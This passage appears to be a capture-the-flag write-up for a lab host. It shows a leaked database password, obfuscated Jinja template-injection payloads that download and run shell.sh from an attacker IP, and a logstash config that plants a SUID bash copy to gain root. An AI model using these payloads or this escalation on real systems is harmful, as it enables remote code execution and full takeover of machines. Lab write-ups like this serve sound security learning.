out of curiosity i did this and found 

```bash
$cat webapp.py 

def connect_database():
  global connection
  connection = pymysql.connect(host="localhost", user="temple_user", password="4$pCM!&bEEs$SR8H", db="temple",cursorclass=pymysql.cursors.DictCursor)
  return connection
```


So created the little script

```python 

import pymysql
connection = pymysql.connect(host="localhost",user="temple_user",password="4$pCM!&bEEs$SR8H",db="temple",cursorclass=pymysql.cursors.DictCursor)
with connection:
  with connection.cursor() as cursor:
    sql = input("Execute query: ")
    cursor.execute(sql)
    print(cursor.fetchall())
```

```bash
python3 get_users.py
Execute query: SELECT * FROM users
[{'user_id': 1, 'email': 'admin@templeindustries.local', 'username': 'admin', 'password': '96e48e470254b5d7f8a2920a786e7652716f4f9c661fb029258b00ea'}, {'user_id': 2, 'email': '344312noone@gmail.com', 'username': '{% set var1 = request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f") %} {% set var2 = var1["\\x5f\\x5fbuiltins\\x5f\\x5f"] %} {% set os = var2["\\x5f\\x5fimport\\x5f\\x5f"]("os") %} {{os|attr("popen")("curl http://10.10.143.28:8000/shell.sh > shell.sh")|attr("read")()}}', 'password': '194c4c5045aee1019b77cb1be88ac68034eb2ddd5a8368054141a11f'}, {'user_id': 3, 'email': '312548noone@gmail.com', 'username': '{% set var1 = request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f") %} {% set var2 = var1["\\x5f\\x5fbuiltins\\x5f\\x5f"] %} {% set os = var2["\\x5f\\x5fimport\\x5f\\x5f"]("os") %} {{os|attr("popen")("chmod +x  shell.sh")|attr("read")()}}', 'password': '194c4c5045aee1019b77cb1be88ac68034eb2ddd5a8368054141a11f'}, {'user_id': 4, 'email': '156941noone@gmail.com', 'username': '{% set var1 = request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f") %} {% set var2 = var1["\\x5f\\x5fbuiltins\\x5f\\x5f"] %} {% set os = var2["\\x5f\\x5fimport\\x5f\\x5f"]("os") %} {{os|attr("popen")("./shell.sh")|attr("read")()}}', 'password': '194c4c5045aee1019b77cb1be88ac68034eb2ddd5a8368054141a11f'}]
```

The password, according to the code, the algorithm is SHA2(%s,224), hashlib.sha224() more precisely 

```python
m = hashlib.sha224()
m.update(password.encode())
hashed_password = m.hexdigest()
```

Actually nevermind, it has nothing to do with the challenge :(


## Other recon

- systemwide it is python2.7, but bill has python3.6
- nothing in /bill/.local
- inside .cache there seems to be a weird directory pip, with files with names of hashes
```txt
./pip/http/f/7/9/0/4:
total 140
drwx------ 2 bill bill   4096 Jul 24  2021 .
drwx------ 3 bill bill   4096 Jul 24  2021 ..
-rw------- 1 bill bill 134327 Jul 24  2021 f79042c06bf99597e73ebc5a31eb02bccaa27ff74c3492cda6d2df12
```
- After a while searching i found that there is absolutely nothing in this directory of bill.
- bill is uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),30(dip),46(plugdev)
  adm -> can view logs, so probably useful checking out
  cdrom -> access to drives
  dip -> PPP  is the protocol used for establishing internet links over dial-
       up modems, DSL connections, and many other types  of  point-to-point
       links.
  plugdev -> plugdev: Allows members to mount (only with the options nodev and nosuid, for security reasons) and umount removable devices through pmount.

```txt
find ./ -group adm -type f 2>/dev/null
/var/log/auth.log
/var/log/cloud-init-output.log
/var/log/kern.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/apport.log
/var/log/mysql
/var/log/mysql/error.log
/var/log/syslog
/var/log/apache2
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/error.log
/var/log/apache2/access.log
/var/log/cloud-init.log
/var/spool/rsyslog
/snap/core/11743/var/log/dmesg
/snap/core/11743/var/log/fsck/checkfs
/snap/core/11743/var/log/fsck/checkroot
/snap/core/11743/var/spool/rsyslog
/snap/core/11316/var/log/dmesg
/snap/core/11316/var/log/fsck/checkfs
/snap/core/11316/var/log/fsck/checkroot
/snap/core/11316/var/spool/rsyslog

```

after a bit of digging, this is not so useful

- User has no useful cron jobs, and niether root
- find / -executable -perm /+s -user root 2>/dev/null 
  ```bash
  find / -executable -perm /+s -user root 2>/dev/null
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/var/log/journal
/var/log/journal/a0c3b4c08a8a480898273ce7bc699d5c
/var/local
/var/mail
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/mount
/usr/local/lib/python2.7
/usr/local/lib/python2.7/site-packages
/usr/local/lib/python2.7/dist-packages
/usr/local/lib/python3.6
/usr/local/lib/python3.6/dist-packages
/usr/bin/newgrp
/usr/bin/crontab
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/ssh-agent
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/mlocate
/usr/bin/chfn
/usr/bin/bsd-write
/usr/bin/wall
/usr/bin/newuidmap
/usr/bin/chage
/usr/bin/expiry
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign

  ```
  
  ```bash
  ls -la /usr/local/lib/python2.7
total 16
drwxrwsr-x 4 root staff 4096 Oct  3  2021 .
drwxr-xr-x 4 root root  4096 Oct  3  2021 ..
drwxrwsr-x 2 root staff 4096 Oct  3  2021 dist-packages
drwxrwsr-x 2 root staff 4096 Oct  3  2021 site-packages
bill@temple:~/webapp$ ls -la /usr/local/lib/python3.6
ls -la /usr/local/lib/python3.6
total 12
drwxrwsr-x 3 root staff 4096 Jul 25  2018 .
drwxr-xr-x 4 root root  4096 Oct  3  2021 ..
drwxrwsr-x 2 root staff 4096 Jul 25  2018 dist-packages
   ```
- Nothing interesting with capabilities
  ```bash
  getcap / -r 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
```
- The other two users have literally nothing in their directories
- weird
  ```bash
  bill@temple:/home$ ls -la /usr/bin/sudo
ls -la /usr/bin/sudo
-rwSr--r-- 1 root root 149080 Jan 19  2021 /usr/bin/sudo
```

- found a weird process called logstash in /usr/share
  ```bash
  2024/07/04 07:44:50 CMD: UID=0    PID=1214   | /usr/share/logstash/jdk/bin/java -Xms128m -Xmx256m -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -Djruby.regexp.interruptible=true -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -Dlog4j2.isThreadContextMapInheritable=true -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/checker-compat-qual-2.0.0.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/commons-logging-1.2.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.1.3.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-24.1.1-jre.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.10.8.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-yaml-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/javassist-3.26.0-GA.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.2.19.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-1.2-api-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-jcl-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/reflections-0.9.11.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.30.jar:/usr/share/logstash/logstash-core/lib/jars/snakeyaml-1.23.jar org.logstash.Logstash --path.settings /etc/logstash 
  ```
It also exists in /etc/logstash
  ```bash
  find ./ -writable 
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/Rakefile
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/README.md
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/test/test_benchmark_ips.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/History.txt
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/report.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/job/noop_report.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/job/stdout_report.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/job/entry.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/stats/sd.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/stats/bootstrap.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/stats/stats_metric.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/noop_suite.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/job.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips/share.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/timing.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/ips.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/lib/benchmark/compare.rb
./vendor/bundle/jruby/2.5.0/gems/benchmark-ips-2.9.1/Manifest.txt
  ```

  ```bash
  bill@temple:/etc/logstash$ ls -la
ls -la
total 48
drwxr-xr-x   3 root root  4096 Oct  4  2021 .
drwxr-xr-x 101 root root  4096 Oct  4  2021 ..
dr-xr-xr-x   2 root root  4096 Oct  3  2021 conf.d
-rw-r--r--   1 root root  2038 Oct  4  2021 jvm.options
-rw-r--r--   1 root root  7452 Oct  3  2021 log4j2.properties
-rw-r--r--   1 root root   342 Sep 16  2021 logstash-sample.conf
-rw-r--r--   1 root root 11223 Oct  3  2021 logstash.yml
-rw-r--r--   1 root root   285 Oct  3  2021 pipelines.yml
-rw-------   1 root root  1696 Sep 16  2021 startup.options
  ```

  found this special files being run

```bash
bill@temple:/etc/logstash$ cat pipelines.yml
cat pipelines.yml
# This file is where you define your pipelines. You can define multiple.
# For more information on multiple pipelines, see the documentation:
#   https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"

bill@temple:/etc/logstash/conf.d$ ls -la
ls -la
total 12
dr-xr-xr-x 2 root root 4096 Oct  3  2021 .
drwxr-xr-x 3 root root 4096 Oct  4  2021 ..
-r--r--rw- 1 root root  101 Oct  4  2021 logstash-sample.conf
```

So let us create the following:

```bash
input {
  exec {
    command => "cp /bin/bash /home/bill/bash; chmod +xs /home/bill/bash"
    interval => 10
  }
}

output {
  file {
    path => "/tmp/works"
    codec => rubydebug
  }
}
```

```bash
bill@temple:~$ cat config > /etc/logstash/conf.d/logstash-sample.conf
cat config > /etc/logstash/conf.d/logstash-sample.conf
```
